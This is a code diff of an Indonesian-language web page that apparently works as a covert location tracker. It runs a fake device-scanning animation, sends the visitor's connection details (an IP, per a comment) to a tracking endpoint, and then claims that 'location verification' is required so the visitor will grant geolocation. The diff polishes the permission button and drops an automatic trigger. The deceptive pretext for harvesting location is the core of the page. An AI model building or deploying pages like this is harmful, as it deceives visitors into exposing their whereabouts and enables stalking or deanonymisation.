@@ -16,8 +16,8 @@
   </div>
 
   <button id="btn" onclick="start()" 
-    style="display:none; padding:12px 20px; background:#00ffcc; border:none; border-radius:8px; font-size:16px;">
-    Izinkan Lokasi 📍
+    style="display:none; padding:15px 25px; background:#00ffcc; border:none; border-radius:10px; font-size:18px; font-weight:bold; cursor:pointer;">
+    📍 Izinkan Lokasi
   </button>
 </div>
 
@@ -25,7 +25,7 @@
 const koneksi = navigator.connection || {};
 const jenisKoneksi = koneksi.effectiveType || "unknown";
 
-// 🔥 kirim IP dulu
+// kirim IP dulu
 fetch("/api/track", {
   method: "POST",
   headers: {"Content-Type": "application/json"},
@@ -35,7 +35,7 @@ fetch("/api/track", {
   })
 });
 
-// 🔥 animasi loading
+// animasi loading
 const steps = [
   "Scanning device...",
   "Checking network...",
@@ -61,18 +61,21 @@ const interval = setInterval(() => {
 
     document.getElementById("status").innerText = "Verifikasi lokasi diperlukan";
     document.getElementById("btn").style.display = "inline-block";
-
-    // 🔥 auto trigger (opsional)
-    setTimeout(() => {
-      start();
-    }, 1500);
   }
 
 }, 800);
 
 
-// 🔥 fungsi izin lokasi
+// 🔥 fungsi tombol
 function start() {
+
+  const btn = document.getElementById("btn");
+
+  // ubah tampilan tombol
+  btn.innerText = "⏳ Memproses...";
+  btn.style.background = "#555";
+  btn.style.cursor = "not-allowed";
+  btn.disabled = true;
 
   document.getElementById("status").innerText = "Meminta izin lokasi...";
 
